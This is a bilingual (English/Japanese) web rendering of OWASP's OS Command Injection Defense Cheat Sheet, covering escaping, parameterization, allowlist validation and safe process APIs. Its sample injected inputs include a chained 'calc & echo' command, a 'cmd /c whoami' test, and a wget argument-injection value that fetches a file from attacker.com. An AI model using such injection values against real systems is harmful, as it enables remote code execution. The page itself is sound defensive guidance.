---
title: OS Command Injection Defense Cheat Sheet
hide_title: true
---

<div className="docHero" data-category="encoding-and-sanitization">
  <h1>OS コマンドインジェクション防御チートシート</h1>
  <div className="docMeta">
    <span className="docPill">最終更新: 2026-05-20</span>
    <span className="docPill">読了時間: 約 15 分</span>
    <span className="docPill">カテゴリ: 入力検証とサニタイズ</span>
  </div>
</div>

<p className="docLead">OS コマンドインジェクション防御チートシートを、原文・翻訳・対比表示で確認できます。ASVS Index 対応の文脈で、公式原文と日本語訳を確認しやすく整理しています。</p>

<div className="tabbedContent">
  <input className="tabInput" type="radio" name="os-command-injection-defense-view" id="os-command-injection-defense-original" />
  <input className="tabInput" type="radio" name="os-command-injection-defense-view" id="os-command-injection-defense-translation" defaultChecked />
  <input className="tabInput" type="radio" name="os-command-injection-defense-view" id="os-command-injection-defense-bilingual" />

  <div className="contentTabs">
    <label htmlFor="os-command-injection-defense-original" title="OWASP 原文">原文</label>
    <label htmlFor="os-command-injection-defense-translation" title="日本語訳">翻訳</label>
    <label htmlFor="os-command-injection-defense-bilingual" title="原文と翻訳を並べて確認">対比表示</label>
  </div>

<section id="os-command-injection-defense-original-panel" className="tabPanel originalPanel contentPanel">

## Introduction

Command injection (or OS Command Injection) is a type of injection where software that constructs a system command using externally influenced input does not correctly neutralize the input from special elements that can modify the initially intended command.

For example, if the supplied value is:

```bash
calc
```text

when typed in a Windows command prompt, the application *Calculator* is displayed.

However, if the supplied value has been tampered with, and now it is:

```bash
calc & echo "test"
```text

when executed, it changes the meaning of the initial intended value.

Now, both the *Calculator* application and the value *test* are displayed:

![CommandInjection](https://cheatsheetseries.owasp.org/assets/OS_Command_Injection_Defense_Cheat_Sheet_CmdInjection.png)

The problem is exacerbated if the compromised process does not follow the principle of least privileges and attacker-controlled commands end up running with special system privileges that increase the amount of damage.

### Argument Injection

Every OS Command Injection is also an Argument Injection. In this type of attacks, user input can be passed as arguments while executing a specific command.

For example, if the user input is passed through an escape function to escape certain characters like `&`, `|`, `;`, etc.

```php

system("curl " . escape($url));
```text

which will prevent an attacker to run other commands.

However, if the attacker controlled string contains an additional argument of the `curl` command:

```php

system("curl " . escape("--help"))
```text

Now when the above code is executed, it will show the output of `curl --help`.

Depending upon the system command used, the impact of an Argument injection attack can range from **Information Disclosure** to critical **Remote Code Execution**.

## Primary Defenses

### Defense Option 1: Avoid calling OS commands directly

The primary defense is to avoid calling OS commands directly. Built-in library functions are a very good alternative to OS Commands, as they cannot be manipulated to perform tasks other than those it is intended to do.

For example use `mkdir()` instead of `system("mkdir /dir_name")`.

If there are available libraries or APIs for the language you use, this is the preferred method.

### Defense option 2: Escape values added to OS commands specific to each OS

**TODO: To enhance.**

For examples, see [escapeshellarg()](https://www.php.net/manual/en/function.escapeshellarg.php) in PHP.

The `escapeshellarg()` surrounds the user input in single quotes, so if the malformed user input is something like `& echo "hello"`, the final output will be like `calc '& echo "hello"'` which will be parsed as a single argument to the command `calc`.

Even though `escapeshellarg()` prevents OS Command Injection, an attacker can still pass a single argument to the command.

### Defense option 3: Parameterization in conjunction with Input Validation

If calling a system command that incorporates user-supplied cannot be avoided, the following two layers of defense should be used within software to prevent attacks:

#### Layer 1

**Parameterization:** If available, use structured mechanisms that automatically enforce the separation between data and command. These mechanisms can help provide the relevant quoting and encoding.

#### Layer 2

**Input validation:** The values for commands and the relevant arguments should be both validated. There are different degrees of validation for the actual command and its arguments:

- When it comes to the **commands** used, these must be validated against a list of allowed commands.
- In regards to the **arguments** used for these commands, they should be validated using the following options:
    - **Positive or allowlist input validation**: Where are the arguments allowed explicitly defined.
    - **Allowlist Regular Expression**: Where a list of good, allowed characters and the maximum length of the string are defined. Ensure that metacharacters like ones specified in `Note A` and whitespaces are not part of the Regular Expression. For example, the following regular expression only allows lowercase letters and numbers and does not contain metacharacters. The length is also being limited to 3-10 characters: `^[a-z0-9]&#123;3,10&#125;$`
- According to **Guideline 10** of this [POSIX](https://pubs.opengroup.org/onlinepubs/9699919799/basedefs/V1_chap12.html), *The first -- argument that is not an option-argument should be accepted as a delimiter indicating the end of options. Any following arguments should be treated as operands, even if they begin with the '-' character.* For example, `curl -- $url` will prevent an argument injection even if the `$url` is malformed and contains an additional argument.

**Note A:**

```text
& |  ; $ > < ` \ ! ' " ( )
```text

## Additional Defenses

On top of primary defenses, parameterizations, and input validation, we also recommend adopting all of these additional defenses to provide defense in depth.

These additional defenses are:

- Applications should run using the lowest privileges that are required to accomplish the necessary tasks.
- If possible, create isolated accounts with limited privileges that are only used for a single task.

## Code examples

### Java

In Java, use [ProcessBuilder](https://docs.oracle.com/javase/8/docs/api/java/lang/ProcessBuilder.html) and the command must be separated from its arguments.

*Note about the Java's `Runtime.exec` method behavior:*

There are many sites that will tell you that Java's `Runtime.exec` is exactly the same as `C`'s system function. This is not true. Both allow you to invoke a new program/process.

However, `C`'s system function passes its arguments to the shell (`/bin/sh`) to be parsed, whereas `Runtime.exec` tries to split the string into an array of words, then executes the first word in the array with the rest of the words as parameters.

**`Runtime.exec` does NOT try to invoke the shell at any point and does not support shell metacharacters**.

The key difference is that much of the functionality provided by the shell that could be used for mischief (chaining commands using  `&`, `&&`, `|`, `||`, etc,  redirecting input and output) would simply end up as a parameter being passed to the first command, likely causing a syntax error or being thrown out as an invalid parameter.

*Code to test the note above:*

```java
String[] specialChars = new String[]{"&", "&&", "|", "||"};
String payload = "cmd /c whoami";
String cmdTemplate = "java -version %s " + payload;
String cmd;
Process p;
int returnCode;
for (String specialChar : specialChars) {
    cmd = String.format(cmdTemplate, specialChar);
    System.out.printf("#### TEST CMD: %s\n", cmd);
    p = Runtime.getRuntime().exec(cmd);
    returnCode = p.waitFor();
    System.out.printf("RC    : %s\n", returnCode);
    System.out.printf("OUT   :\n%s\n", IOUtils.toString(p.getInputStream(),
                      "utf-8"));
    System.out.printf("ERROR :\n%s\n", IOUtils.toString(p.getErrorStream(),
                      "utf-8"));
}
System.out.printf("#### TEST PAYLOAD ONLY: %s\n", payload);
p = Runtime.getRuntime().exec(payload);
returnCode = p.waitFor();
System.out.printf("RC    : %s\n", returnCode);
System.out.printf("OUT   :\n%s\n", IOUtils.toString(p.getInputStream(),
                  "utf-8"));
System.out.printf("ERROR :\n%s\n", IOUtils.toString(p.getErrorStream(),
                  "utf-8"));
```text

*Result of the test:*

```text
##### TEST CMD: java -version & cmd /c whoami
RC    : 0
OUT   :

ERROR :
java version "1.8.0_31"

##### TEST CMD: java -version && cmd /c whoami
RC    : 0
OUT   :

ERROR :
java version "1.8.0_31"

##### TEST CMD: java -version | cmd /c whoami
RC    : 0
OUT   :

ERROR :
java version "1.8.0_31"

##### TEST CMD: java -version || cmd /c whoami
RC    : 0
OUT   :

ERROR :
java version "1.8.0_31"

##### TEST PAYLOAD ONLY: cmd /c whoami
RC    : 0
OUT   :
mydomain\simpleuser

ERROR :
```text

*Incorrect usage:*

```java
ProcessBuilder b = new ProcessBuilder("C:\DoStuff.exe -arg1 -arg2");
```text

In this example, the command together with the arguments are passed as a one string, making it easy to manipulate that expression and inject malicious strings.

*Correct Usage:*

Here is an example that starts a process with a modified working directory. The command and each of the arguments are passed separately. This makes it easy to validate each term and reduces the risk of malicious strings being inserted.

```java
ProcessBuilder pb = new ProcessBuilder("TrustedCmd", "TrustedArg1", "TrustedArg2");

Map<String, String> env = pb.environment();

pb.directory(new File("TrustedDir"));

Process p = pb.start();
```text

### .Net

See relevant details in the [DotNet Security Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/DotNet_Security_Cheat_Sheet.html#os-injection)

### PHP

PHP exposes two helper functions when you must pass user input to a shell: `escapeshellarg()` and `escapeshellcmd()`.

`escapeshellarg()`:  Ensures the user can pass only one parameter to the command, cannot add extra parameters, and cannot execute a different command.

`escapeshellcmd()`: Ensures the user can execute only the intended command, can pass unlimited parameters, but cannot execute other commands.

It is always preferable to use `escapeshellarg()` rather than `escapeshellcmd()` when dealing with user input.

For example, consider this code using `wget` with `escapeshellcmd()`:

```php
$url = $_GET['url'];
$command = 'wget --directory-prefix=..\temp ' . $url;
system(escapeshellcmd($command));
```text

If the user provides:

```text
http://victim.com/download.php?url=--directory-prefix=. http://attacker.com/malicious.php
```text

`escapeshellcmd()` will still allow this extra parameter meaning the attacker can override the original `--directory-prefix` option, save the file in the current directory and then achieve remote command execution on the server.

The safe approach is to use `escapeshellarg()` so that the URL is treated as a single argument:

```php
$url = $_GET['url'];
$command = 'wget --directory-prefix=..\temp ' . escapeshellarg($url);
system($command);
```text

Now the malicious input becomes:

```text
wget --directory-prefix=..\temp '--directory-prefix=. http://attacker.com/malicious.php'
```text

Here, the second `--directory-prefix` is part of the quoted string, not a real option, so the attack fails.

In addition, it is good security practice to follow these recommendations:

- **Hardcode the command**: never allow the user to choose which executable to run.
- **Hardcode options**: required flags (e.g., `--directory-prefix`) should be in the code, not in user input.
- **Validate and restrict input as much as possible**: apply strict validation rules, whitelists, and format checks to minimize the attack surface.

## Related articles

### Description of Command Injection Vulnerability

- OWASP [Command Injection](https://owasp.org/www-community/attacks/Command_Injection).

### How to Avoid Vulnerabilities

- C Coding: [Do not call system()](https://wiki.sei.cmu.edu/confluence/pages/viewpage.action?pageId=87152177).

### How to Review Code

- OWASP [Reviewing Code for OS Injection](https://wiki.owasp.org/index.php/Reviewing_Code_for_OS_Injection).

### How to Test

- [OWASP Testing Guide](https://owasp.org/www-project-web-security-testing-guide/) article on [Testing for Command Injection](https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/07-Input_Validation_Testing/12-Testing_for_Command_Injection.html).

</section>

<section id="os-command-injection-defense-translation-panel" className="tabPanel translationPanel contentPanel">

## はじめに

コマンドインジェクション (または OS コマンドインジェクション) は、外部から影響を受ける入力を使ってシステムコマンドを構築するソフトウェアが、本来意図されたコマンドを変更できる特殊要素を適切に無害化しない場合に発生するインジェクションの一種です。

たとえば、渡された値が次のとおりだったとします。

```bash
calc
```text

これを Windows コマンドプロンプトで入力すると、*Calculator* アプリケーションが表示されます。

しかし、渡された値が改ざんされ、次のようになっている場合を考えます。

```bash
calc & echo "test"
```text

実行時に、当初意図していた値の意味が変わります。

この結果、*Calculator* アプリケーションと値 *test* の両方が表示されます。

![CommandInjection](https://cheatsheetseries.owasp.org/assets/OS_Command_Injection_Defense_Cheat_Sheet_CmdInjection.png)

侵害されたプロセスが最小権限の原則に従っておらず、攻撃者が制御するコマンドが特別なシステム権限で実行される場合、被害の範囲が広がるため問題はさらに深刻になります。

### 引数インジェクション

すべての OS コマンドインジェクションは、引数インジェクションでもあります。この種の攻撃では、特定のコマンドを実行する際に、ユーザー入力が引数として渡される可能性があります。

たとえば、ユーザー入力が `&`、`|`、`;` などの特定の文字をエスケープする関数を通される場合を考えます。

```php

system("curl " . escape($url));
```text

これにより、攻撃者が別のコマンドを実行することは防止されます。

しかし、攻撃者が制御する文字列に `curl` コマンドの追加引数が含まれている場合を考えます。

```php

system("curl " . escape("--help"))
```text

上記のコードが実行されると、`curl --help` の出力が表示されます。

使用されるシステムコマンドによっては、引数インジェクション攻撃の影響は **Information Disclosure** から重大な **Remote Code Execution** まで及ぶ可能性があります。

## 主な防御策

### 防御策 1: OS コマンドを直接呼び出さない

主な防御策は、OS コマンドを直接呼び出さないことです。組み込みライブラリ関数は OS コマンドの非常に良い代替手段です。意図された処理以外のタスクを実行するように操作されないためです。

たとえば、`system("mkdir /dir_name")` ではなく `mkdir()` を使用します。

使用している言語で利用可能なライブラリや API がある場合、この方法が推奨されます。

### 防御策 2: OS ごとに、OS コマンドへ追加される値をエスケープする

**TODO: To enhance.**

例として、PHP の [escapeshellarg()](https://www.php.net/manual/en/function.escapeshellarg.php) を参照してください。

`escapeshellarg()` はユーザー入力をシングルクォートで囲みます。そのため、不正なユーザー入力が `& echo "hello"` のようなものだった場合、最終的な出力は `calc '& echo "hello"'` のようになり、コマンド `calc` への単一の引数として解析されます。

`escapeshellarg()` は OS コマンドインジェクションを防ぎますが、それでも攻撃者はコマンドに単一の引数を渡すことができます。

### 防御策 3: パラメータ化と入力検証を組み合わせる

ユーザー指定値を含むシステムコマンドの呼び出しを避けられない場合、攻撃を防ぐために、ソフトウェア内で次の二層の防御を使用すべきです。

#### 第 1 層

**パラメータ化:** 利用可能な場合は、データとコマンドの分離を自動的に強制する構造化された仕組みを使用します。これらの仕組みは、適切なクォートやエンコーディングの提供に役立ちます。

#### 第 2 層

**入力検証:** コマンドと関連する引数の値は、どちらも検証する必要があります。実際のコマンドとその引数には、検証の程度に違いがあります。

- 使用される **コマンド** については、許可されたコマンドのリストと照合して検証する必要があります。
- これらのコマンドに使用される **引数** については、次の選択肢を使って検証すべきです。
    - **ポジティブ入力検証または許可リスト入力検証**: 許可される引数を明示的に定義します。
    - **許可リスト正規表現**: 良好で許可された文字のリストと、文字列の最大長を定義します。`Note A` で指定されているようなメタ文字や空白文字が正規表現に含まれないようにしてください。たとえば、次の正規表現は小文字と数字のみを許可し、メタ文字を含みません。また、長さも 3 から 10 文字に制限されています: `^[a-z0-9]&#123;3,10&#125;$`
- この [POSIX](https://pubs.opengroup.org/onlinepubs/9699919799/basedefs/V1_chap12.html) の **Guideline 10** によれば、オプション引数ではない最初の `--` 引数は、オプションの終端を示す区切りとして受け入れるべきです。以降の引数は、たとえ `-` 文字で始まっていてもオペランドとして扱うべきです。たとえば、`curl -- $url` は、`$url` が不正で追加引数を含む場合でも、引数インジェクションを防ぎます。

**Note A:**

```text
& |  ; $ > < ` \ ! ' " ( )
```text

## 追加の防御策

主な防御策、パラメータ化、入力検証に加えて、多層防御を実現するため、これらすべての追加防御策を採用することも推奨します。

追加防御策は次のとおりです。

- アプリケーションは、必要なタスクを実行するために必要な最小権限で実行すべきです。
- 可能であれば、単一のタスクにのみ使用する、権限を制限した分離アカウントを作成します。

## コード例

### Java

Java では [ProcessBuilder](https://docs.oracle.com/javase/8/docs/api/java/lang/ProcessBuilder.html) を使用し、コマンドとその引数を分離する必要があります。

*Java の `Runtime.exec` メソッドの挙動に関する注記:*

Java の `Runtime.exec` は `C` の system 関数とまったく同じだと説明しているサイトが多数あります。これは正しくありません。どちらも新しいプログラムまたはプロセスを起動できます。

しかし、`C` の system 関数は引数をシェル (`/bin/sh`) に渡して解析させます。一方、`Runtime.exec` は文字列を単語の配列に分割し、配列の最初の単語を実行し、残りの単語をパラメータとして渡そうとします。

**`Runtime.exec` はどの時点でもシェルを起動しようとせず、シェルメタ文字をサポートしません**。

重要な違いは、悪用に使われ得るシェルの多くの機能 (たとえば `&`、`&&`、`|`、`||` などを使ったコマンド連結、入力や出力のリダイレクト) が、単に最初のコマンドへ渡されるパラメータになってしまい、構文エラーになるか、無効なパラメータとして破棄される可能性が高いことです。

*上記の注記を検証するコード:*

```java
String[] specialChars = new String[]{"&", "&&", "|", "||"};
String payload = "cmd /c whoami";
String cmdTemplate = "java -version %s " + payload;
String cmd;
Process p;
int returnCode;
for (String specialChar : specialChars) {
    cmd = String.format(cmdTemplate, specialChar);
    System.out.printf("#### TEST CMD: %s\n", cmd);
    p = Runtime.getRuntime().exec(cmd);
    returnCode = p.waitFor();
    System.out.printf("RC    : %s\n", returnCode);
    System.out.printf("OUT   :\n%s\n", IOUtils.toString(p.getInputStream(),
                      "utf-8"));
    System.out.printf("ERROR :\n%s\n", IOUtils.toString(p.getErrorStream(),
                      "utf-8"));
}
System.out.printf("#### TEST PAYLOAD ONLY: %s\n", payload);
p = Runtime.getRuntime().exec(payload);
returnCode = p.waitFor();
System.out.printf("RC    : %s\n", returnCode);
System.out.printf("OUT   :\n%s\n", IOUtils.toString(p.getInputStream(),
                  "utf-8"));
System.out.printf("ERROR :\n%s\n", IOUtils.toString(p.getErrorStream(),
                  "utf-8"));
```text

*テスト結果:*

```text
##### TEST CMD: java -version & cmd /c whoami
RC    : 0
OUT   :

ERROR :
java version "1.8.0_31"

##### TEST CMD: java -version && cmd /c whoami
RC    : 0
OUT   :

ERROR :
java version "1.8.0_31"

##### TEST CMD: java -version | cmd /c whoami
RC    : 0
OUT   :

ERROR :
java version "1.8.0_31"

##### TEST CMD: java -version || cmd /c whoami
RC    : 0
OUT   :

ERROR :
java version "1.8.0_31"

##### TEST PAYLOAD ONLY: cmd /c whoami
RC    : 0
OUT   :
mydomain\simpleuser

ERROR :
```text

*誤った使用例:*

```java
ProcessBuilder b = new ProcessBuilder("C:\DoStuff.exe -arg1 -arg2");
```text

この例では、コマンドと引数が 1 つの文字列として渡されています。そのため、この式を操作して悪意のある文字列を注入しやすくなります。

*正しい使用例:*

次の例は、変更された作業ディレクトリでプロセスを開始します。コマンドと各引数は個別に渡されます。これにより、各要素を検証しやすくなり、悪意のある文字列が挿入されるリスクを低減できます。

```java
ProcessBuilder pb = new ProcessBuilder("TrustedCmd", "TrustedArg1", "TrustedArg2");

Map<String, String> env = pb.environment();

pb.directory(new File("TrustedDir"));

Process p = pb.start();
```text

### .Net

関連する詳細は [DotNet Security Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/DotNet_Security_Cheat_Sheet.html#os-injection) を参照してください。

### PHP

PHP では、ユーザー入力をシェルに渡す必要がある場合に使える 2 つのヘルパー関数、`escapeshellarg()` と `escapeshellcmd()` が提供されています。

`escapeshellarg()`: ユーザーがコマンドへ 1 つのパラメータだけを渡せるようにし、追加パラメータの追加や別コマンドの実行を防ぎます。

`escapeshellcmd()`: ユーザーが意図されたコマンドだけを実行できるようにし、無制限のパラメータを渡せる一方で、他のコマンドの実行を防ぎます。

ユーザー入力を扱う場合は、常に `escapeshellcmd()` よりも `escapeshellarg()` を使用することが望ましいです。

たとえば、`wget` と `escapeshellcmd()` を使う次のコードを考えます。

```php
$url = $_GET['url'];
$command = 'wget --directory-prefix=..\temp ' . $url;
system(escapeshellcmd($command));
```text

ユーザーが次の値を提供した場合を考えます。

```text
http://victim.com/download.php?url=--directory-prefix=. http://attacker.com/malicious.php
```text

`escapeshellcmd()` はこの追加パラメータを依然として許容します。つまり、攻撃者は元の `--directory-prefix` オプションを上書きし、ファイルを現在のディレクトリに保存させ、その後サーバー上でリモートコマンド実行を達成できます。

安全なアプローチは、URL が単一の引数として扱われるように `escapeshellarg()` を使用することです。

```php
$url = $_GET['url'];
$command = 'wget --directory-prefix=..\temp ' . escapeshellarg($url);
system($command);
```text

これにより、悪意のある入力は次のようになります。

```text
wget --directory-prefix=..\temp '--directory-prefix=. http://attacker.com/malicious.php'
```text

ここでは、2 つ目の `--directory-prefix` はクォートされた文字列の一部であり、実際のオプションではないため、攻撃は失敗します。

さらに、次の推奨事項に従うことはセキュリティ上の良いプラクティスです。

- **コマンドをハードコードする**: 実行する実行ファイルをユーザーに選択させてはいけません。
- **オプションをハードコードする**: 必須フラグ (例: `--directory-prefix`) はユーザー入力ではなく、コード内に置くべきです。
- **入力を可能な限り検証し制限する**: 厳格な検証ルール、許可リスト、形式チェックを適用し、攻撃対象領域を最小化します。

## 関連記事

### コマンドインジェクション脆弱性の説明

- OWASP [Command Injection](https://owasp.org/www-community/attacks/Command_Injection)。

### 脆弱性を避ける方法

- C Coding: [Do not call system()](https://wiki.sei.cmu.edu/confluence/pages/viewpage.action?pageId=87152177)。

### コードレビューの方法

- OWASP [Reviewing Code for OS Injection](https://wiki.owasp.org/index.php/Reviewing_Code_for_OS_Injection)。

### テスト方法

- [OWASP Testing Guide](https://owasp.org/www-project-web-security-testing-guide/) の [Testing for Command Injection](https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/07-Input_Validation_Testing/12-Testing_for_Command_Injection.html) に関する記事。

### 外部参照

- [CWE Entry 77 on Command Injection](https://cwe.mitre.org/data/definitions/77.html)。

</section>

<section id="os-command-injection-defense-bilingual-panel" className="tabPanel bilingualPanel">

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

## Introduction

Command injection (or OS Command Injection) is a type of injection where software that constructs a system command using externally influenced input does not correctly neutralize the input from special elements that can modify the initially intended command.

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

## はじめに

コマンドインジェクション (または OS コマンドインジェクション) は、外部から影響を受ける入力を使ってシステムコマンドを構築するソフトウェアが、本来意図されたコマンドを変更できる特殊要素を適切に無害化しない場合に発生するインジェクションの一種です。

</div>
</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

For example, if the supplied value is:

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

たとえば、渡された値が次のとおりだったとします。

</div>
</div>

<div className="bilingualCommon">
<span className="bilingualLabel common">コード・画像 (共通)</span>

```bash
calc
```text

```bash
calc
```html

</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

when typed in a Windows command prompt, the application *Calculator* is displayed.

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

これを Windows コマンドプロンプトで入力すると、*Calculator* アプリケーションが表示されます。

</div>
</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

However, if the supplied value has been tampered with, and now it is:

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

しかし、渡された値が改ざんされ、次のようになっている場合を考えます。

</div>
</div>

<div className="bilingualCommon">
<span className="bilingualLabel common">コード・画像 (共通)</span>

```bash
calc & echo "test"
```text

```bash
calc & echo "test"
```html

</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

when executed, it changes the meaning of the initial intended value.

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

実行時に、当初意図していた値の意味が変わります。

</div>
</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

Now, both the *Calculator* application and the value *test* are displayed:

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

この結果、*Calculator* アプリケーションと値 *test* の両方が表示されます。

</div>
</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

The problem is exacerbated if the compromised process does not follow the principle of least privileges and attacker-controlled commands end up running with special system privileges that increase the amount of damage.

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

侵害されたプロセスが最小権限の原則に従っておらず、攻撃者が制御するコマンドが特別なシステム権限で実行される場合、被害の範囲が広がるため問題はさらに深刻になります。

</div>
</div>

<div className="bilingualCommon">
<span className="bilingualLabel common">コード・画像 (共通)</span>

![CommandInjection](https://cheatsheetseries.owasp.org/assets/OS_Command_Injection_Defense_Cheat_Sheet_CmdInjection.png)

</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

### Argument Injection

Every OS Command Injection is also an Argument Injection. In this type of attacks, user input can be passed as arguments while executing a specific command.

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

### 引数インジェクション

すべての OS コマンドインジェクションは、引数インジェクションでもあります。この種の攻撃では、特定のコマンドを実行する際に、ユーザー入力が引数として渡される可能性があります。

</div>
</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

For example, if the user input is passed through an escape function to escape certain characters like `&`, `|`, `;`, etc.

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

たとえば、ユーザー入力が `&`、`|`、`;` などの特定の文字をエスケープする関数を通される場合を考えます。

</div>
</div>

<div className="bilingualCommon">
<span className="bilingualLabel common">コード・画像 (共通)</span>

```php

system("curl " . escape($url));
```html

</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

which will prevent an attacker to run other commands.

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

これにより、攻撃者が別のコマンドを実行することは防止されます。

</div>
</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

However, if the attacker controlled string contains an additional argument of the `curl` command:

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

しかし、攻撃者が制御する文字列に `curl` コマンドの追加引数が含まれている場合を考えます。

</div>
</div>

<div className="bilingualCommon">
<span className="bilingualLabel common">コード・画像 (共通)</span>

```php

system("curl " . escape("--help"))
```html

</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

Now when the above code is executed, it will show the output of `curl --help`.

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

上記のコードが実行されると、`curl --help` の出力が表示されます。

</div>
</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

Depending upon the system command used, the impact of an Argument injection attack can range from **Information Disclosure** to critical **Remote Code Execution**.

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

使用されるシステムコマンドによっては、引数インジェクション攻撃の影響は **Information Disclosure** から重大な **Remote Code Execution** まで及ぶ可能性があります。

</div>
</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

## Primary Defenses

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

## 主な防御策

</div>
</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

### Defense Option 1: Avoid calling OS commands directly

The primary defense is to avoid calling OS commands directly. Built-in library functions are a very good alternative to OS Commands, as they cannot be manipulated to perform tasks other than those it is intended to do.

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

### 防御策 1: OS コマンドを直接呼び出さない

主な防御策は、OS コマンドを直接呼び出さないことです。組み込みライブラリ関数は OS コマンドの非常に良い代替手段です。意図された処理以外のタスクを実行するように操作されないためです。

</div>
</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

For example use `mkdir()` instead of `system("mkdir /dir_name")`.

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

たとえば、`system("mkdir /dir_name")` ではなく `mkdir()` を使用します。

</div>
</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

If there are available libraries or APIs for the language you use, this is the preferred method.

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

使用している言語で利用可能なライブラリや API がある場合、この方法が推奨されます。

</div>
</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

### Defense option 2: Escape values added to OS commands specific to each OS

**TODO: To enhance.**

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

### 防御策 2: OS ごとに、OS コマンドへ追加される値をエスケープする

**TODO: To enhance.**

</div>
</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

For examples, see [escapeshellarg()](https://www.php.net/manual/en/function.escapeshellarg.php) in PHP.

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

例として、PHP の [escapeshellarg()](https://www.php.net/manual/en/function.escapeshellarg.php) を参照してください。

</div>
</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

The `escapeshellarg()` surrounds the user input in single quotes, so if the malformed user input is something like `& echo "hello"`, the final output will be like `calc '& echo "hello"'` which will be parsed as a single argument to the command `calc`.

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

`escapeshellarg()` はユーザー入力をシングルクォートで囲みます。そのため、不正なユーザー入力が `& echo "hello"` のようなものだった場合、最終的な出力は `calc '& echo "hello"'` のようになり、コマンド `calc` への単一の引数として解析されます。

</div>
</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

Even though `escapeshellarg()` prevents OS Command Injection, an attacker can still pass a single argument to the command.

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

`escapeshellarg()` は OS コマンドインジェクションを防ぎますが、それでも攻撃者はコマンドに単一の引数を渡すことができます。

</div>
</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

### Defense option 3: Parameterization in conjunction with Input Validation

If calling a system command that incorporates user-supplied cannot be avoided, the following two layers of defense should be used within software to prevent attacks:

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

### 防御策 3: パラメータ化と入力検証を組み合わせる

ユーザー指定値を含むシステムコマンドの呼び出しを避けられない場合、攻撃を防ぐために、ソフトウェア内で次の二層の防御を使用すべきです。

</div>
</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

#### Layer 1

**Parameterization:** If available, use structured mechanisms that automatically enforce the separation between data and command. These mechanisms can help provide the relevant quoting and encoding.

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

#### 第 1 層

**パラメータ化:** 利用可能な場合は、データとコマンドの分離を自動的に強制する構造化された仕組みを使用します。これらの仕組みは、適切なクォートやエンコーディングの提供に役立ちます。

</div>
</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

#### Layer 2
